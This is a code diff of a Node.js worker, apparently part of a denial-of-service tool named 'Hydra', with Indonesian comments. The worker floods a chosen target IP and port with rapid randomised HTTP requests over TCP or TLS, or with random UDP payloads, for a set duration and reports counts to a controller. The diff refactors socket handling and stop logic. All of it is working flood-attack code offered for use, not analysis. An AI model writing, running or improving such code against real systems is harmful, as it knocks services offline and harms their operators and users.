@@ -4,23 +4,20 @@ const net = require('net');
 const tls = require('tls'); 
 const crypto = require('crypto');
 const dgram = require('dgram'); 
-const path = require('path'); // Untuk akses USER_AGENTS jika di file terpisah
+const path = require('path'); 
 
-// Mengakses workerData di level teratas worker
 const { targetIP, port, attackType, mode, durationMs, httpMethod, workerId, USER_AGENTS, CHARSET } = workerData;
 
-// --- Statistik Worker ---
 let sentRequests = 0;
 let activeConnections = 0; 
 let errors = 0;
 let serverErrors = 0;
-let durationTimer = null; // Timer untuk durasi serangan
-let isStopping = false; // Flag untuk menghentikan worker
+let durationTimer = null; 
+let isStopping = false; 
+let socket = null; // Socket TCP/TLS
 
 // --- Helper Functions ---
-// Pastikan USER_AGENTS dan CHARSET tersedia di sini.
-// Jika tidak dikirim via workerData, definisikan ulang atau impor.
-const LOCAL_USER_AGENTS = USER_AGENTS || [ /* fallback user agents */ "HydraWorkerClient" ];
+const LOCAL_USER_AGENTS = USER_AGENTS || [ "HydraWorkerClient" ];
 const LOCAL_CHARSET = CHARSET || 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
 
 function getRandomBigInt(max) {
@@ -28,9 +25,7 @@ function getRandomBigInt(max) {
         const buffer = crypto.randomBytes(Math.ceil(Math.log2(max) / 8));
         const num = buffer.readUIntBE(0, buffer.length);
         return num % max;
-    } catch (e) {
-        return Math.floor(Math.random() * max);
-    }
+    } catch (e) { return Math.floor(Math.random() * max); }
 }
 
 function generateRandomString(length) {
@@ -61,24 +56,21 @@ function parseHTTPStatus(responseData) {
 }
 
 // --- Logika Serangan HTTP ---
-async function httpAttack(socket, target, method, mode) {
+async function httpAttack(target, method, mode) {
     const requestQueue = [];
     let lastWriteTime = Date.now(); 
 
     for (let i = 0; i < 100; i++) { requestQueue.push(generateRandomString(10)); }
 
-    // Timer durasi serangan
     if (durationMs !== null) {
         durationTimer = setTimeout(() => {
-            // console.log(`Worker ${workerId}: Attack duration reached. Closing connection.`);
-            if (!socket.destroyed) socket.end(); // Tutup koneksi jika belum ditutup
-            isStopping = true; // Tandai worker agar berhenti
+            isStopping = true; 
+            if (socket && !socket.destroyed) socket.end(); 
         }, durationMs);
     }
 
     const attackLoop = async () => {
-        if (isStopping || socket.destroyed) {
-            // console.log(`Worker ${workerId}: Stopping/Destroyed. Exiting httpAttack.`);
+        if (isStopping || !socket || socket.destroyed) {
             return;
         }
 
@@ -95,7 +87,6 @@ async function httpAttack(socket, target, method, mode) {
             activeConnections = 1; 
             lastWriteTime = Date.now();
 
-            // Menangani data yang diterima
             socket.once('data', (data) => {
                 const [status, _] = parseHTTPStatus(data);
                 if (status && (status.startsWith('4') || status.startsWith('5'))) {
@@ -103,15 +94,12 @@ async function httpAttack(socket, target, method, mode) {
                     parentPort.postMessage({ type: 'stats', serverErrors: 1 });
                 }
                 if (mode === 'normal') {
-                    if (!socket.destroyed) socket.end(); // Tutup setelah respon di mode normal
+                    if (socket && !socket.destroyed) socket.end(); 
                 }
             });
 
-            socket.setTimeout(3000); // Timeout baca 3 detik
+            requestQueue.push(generateRandomString(10)); 
 
-            requestQueue.push(generateRandomString(10)); // Tambahkan request baru
-
-            // Kirim update stats secara berkala
             if (sentRequests % 50 === 0) {
                 parentPort.postMessage({ type: 'stats', sent: 50, active: activeConnections, errors: 0, serverErrors: 0 });
             }
@@ -119,27 +107,25 @@ async function httpAttack(socket, target, method, mode) {
         } catch (error) {
             errors++;
             parentPort.postMessage({ type: 'stats', errors: 1 });
-            if (!socket.destroyed) socket.end(); 
+            if (socket && !socket.destroyed) socket.end(); 
         }
         
         // Jadwalkan loop berikutnya
         setTimeout(attackLoop, 1 + Math.floor(Math.random() * 4));
     };
 
-    // Mulai loop serangan
-    attackLoop();
+    attackLoop(); // Mulai loop serangan
 }
 
 // Logika Serangan UDP (Placeholder)
-async function udpAttack(socket, target, port) {
+async function udpAttack(udpSocket, target, port) {
     const startTime = Date.now();
-    while (true) {
-        if (isStopping) break; // Cek flag stop
+    while (!isStopping) { 
         if (durationMs !== null && (Date.now() - startTime > durationMs)) break;
 
         try {
             const payload = Buffer.from(generateRandomString(500 + Math.floor(Math.random() * 500)));
-            socket.send(payload, port, target);
+            udpSocket.send(payload, port, target);
             sentRequests++;
             activeConnections = 1;
             parentPort.postMessage({ type: 'stats', sent: 1, active: activeConnections });
@@ -154,46 +140,45 @@ async function udpAttack(socket, target, port) {
 
 // --- Fungsi Utama Worker ---
 async function runWorker() {
-    let socket = null;
     let isConnectionSuccessful = false;
 
-    // Handler untuk menerima pesan dari main thread (misal: sinyal stop)
     parentPort.on('message', (message) => {
         if (message.type === 'stop') {
-            // console.log(`Worker ${workerId}: Received stop signal.`);
             isStopping = true;
-            clearTimeout(durationTimer); // Hentikan timer durasi jika ada
+            clearTimeout(durationTimer); 
             if (socket && !socket.destroyed) {
-                socket.end(); // Tutup koneksi jika sedang aktif
+                socket.end(); 
             }
         }
     });
 
     try {
-        if (port === 443 || attackType.toLowerCase() === 'https') { // Gunakan HTTPS untuk port 443
+        if (port === 443 || attackType.toLowerCase() === 'https') {
             const options = { host: targetIP, port: port, timeout: 5000 };
             socket = tls.connect(options);
         } else if (attackType === 'http') {
             const options = { host: targetIP, port: port, timeout: 5000 };
             socket = net.connect(options);
         } else if (attackType === 'udp') {
-            const socket = dgram.createSocket('udp4'); // Gunakan udp4
-            
-            socket.on('error', (err) => {
+            const udpSocket = dgram.createSocket('udp4');
+            socket = udpSocket; 
+
+            udpSocket.on('error', (err) => {
                 errors++;
                 parentPort.postMessage({ type: 'stats', errors: 1 });
-                socket.close();
+                udpSocket.close();
+                isStopping = true; 
             });
 
-            socket.on('message', (msg, rinfo) => { // Handle balasan UDP jika ada
+            udpSocket.on('message', (msg, rinfo) => { 
                 serverErrors++;
                 parentPort.postMessage({ type: 'stats', serverErrors: 1 });
             });
 
             activeConnections = 1; 
             parentPort.postMessage({ type: 'stats', active: activeConnections });
-            await udpAttack(socket, targetIP, port); 
-            socket.close();
+            await udpAttack(udpSocket, targetIP, port); 
+            udpSocket.close();
             return; 
         } else {
             throw new Error(`Unsupported attack type: ${attackType}`);
@@ -207,35 +192,39 @@ async function runWorker() {
             httpAttack(socket, targetIP, httpMethod, mode);
         });
 
-        socket.on('timeout', () => {
+        socket.on('timeout', () => { // Timeout koneksi
             errors++;
             parentPort.postMessage({ type: 'stats', errors: 1 });
-            if (!socket.destroyed) socket.end(); 
+            if (socket && !socket.destroyed) socket.end(); 
         });
 
         socket.on('close', (hadError) => {
             activeConnections = 0;
             parentPort.postMessage({ type: 'stats', active: activeConnections });
             clearTimeout(durationTimer); 
+            isStopping = true; 
         });
 
         socket.on('error', (err) => {
             errors++;
             parentPort.postMessage({ type: 'stats', errors: 1 });
-            if (!socket.destroyed) socket.end(); 
+            if (socket && !socket.destroyed) socket.end(); 
+            isStopping = true; 
         });
 
     } catch (error) {
         errors++;
         parentPort.postMessage({ type: 'stats', errors: 1 });
         console.error(`Worker ${workerId}: Global error in worker:`, error.message);
+        isStopping = true; 
     } finally {
-        // Pastikan worker mengirim pesan 'done' hanya sekali
-        if (socket && !socket.destroyed) socket.end(); // Pastikan socket tertutup
+        // Pastikan pesan 'done' dikirim dan socket ditutup
+        if (!isStopping || (socket && socket.destroyed)) { 
+             parentPort.postMessage({ type: 'done', workerId: workerId });
+        }
+        if (socket && !socket.destroyed) socket.end(); 
         clearTimeout(durationTimer); 
-        parentPort.postMessage({ type: 'done', workerId: workerId });
     }
 }
 
-// --- Jalankan Worker ---
 runWorker();
